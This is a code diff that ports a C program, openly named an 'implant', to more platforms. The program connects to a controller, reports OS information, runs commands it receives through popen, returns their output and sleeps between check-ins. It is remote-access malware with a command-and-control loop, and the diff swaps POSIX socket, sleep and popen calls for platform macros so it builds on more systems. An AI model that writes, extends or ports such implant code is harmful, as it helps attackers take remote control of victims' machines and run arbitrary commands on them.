@@ -1,14 +1,11 @@
-#define _POSIX_C_SOURCE 200809L
+
 #include <stdio.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <netdb.h>
+
 #include <string.h>
 #include "protocol.h"
 #include <stdlib.h>
 #include "implant_utils.h"
+#include "platform.h"
 int connect_to_controller()
 {
 
@@ -32,14 +29,14 @@ int connect_to_controller()
     {
 
         perror("inet_pton:");
-        close(implant_fd);
+        CLOSE_SOCKET(implant_fd);
         return -1;
     }
 
     if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
     {
         perror("send:");
-        close(implant_fd);
+        CLOSE_SOCKET(implant_fd);
         return -1;
     }
 
@@ -57,7 +54,7 @@ int connect_to_controller()
         // sending the client hello did not work close the implant
         printf("ERROR!");
         free(os_info);
-        close(implant_fd);
+        CLOSE_SOCKET(implant_fd);
         return -1;
     }
 
@@ -68,6 +65,8 @@ int connect_to_controller()
 
 int main(int argc, char **argv)
 {
+
+    platform_init();
 
     int implant_fd = connect_to_controller();
 
@@ -89,7 +88,7 @@ int main(int argc, char **argv)
         if (recieved_packet == NULL)
         {
 
-            close(implant_fd);
+            CLOSE_SOCKET(implant_fd);
             return 1;
         }
 
@@ -114,8 +113,8 @@ int main(int argc, char **argv)
 
             Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(buffer), buffer};
             send_packet(&response, implant_fd);
-            close(implant_fd);
-            sleep(sleep_duration); // sleep for that duration
+            CLOSE_SOCKET(implant_fd);
+            SLEEP(sleep_duration); // sleep for that duration
             printf("Returned from sleeping for %d seconds \n", sleep_duration);
             implant_fd = connect_to_controller();
 
@@ -218,7 +217,7 @@ int main(int argc, char **argv)
             memcpy(cmd, recieved_packet->payload, recieved_packet->payload_len);
             cmd[recieved_packet->payload_len] = '\0'; // append the null terminator to the string
 
-            FILE *fp = popen(cmd, "r"); // call the command
+            FILE *fp = POPEN(cmd, "r"); // call the command
 
             if (fp == NULL)
             {
@@ -239,7 +238,7 @@ int main(int argc, char **argv)
 
                 Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, bytes_read, output};
                 send_packet(&response, implant_fd);
-                pclose(fp);
+                PCLOSE(fp);
             }
 
             break;
@@ -249,7 +248,7 @@ int main(int argc, char **argv)
         }
     }
 
-    close(implant_fd); // close the implant file descriptors on close
-
+    CLOSE_SOCKET(implant_fd); // close the implant file descriptors on close
+    platform_cleanup();
     return 0;
 }
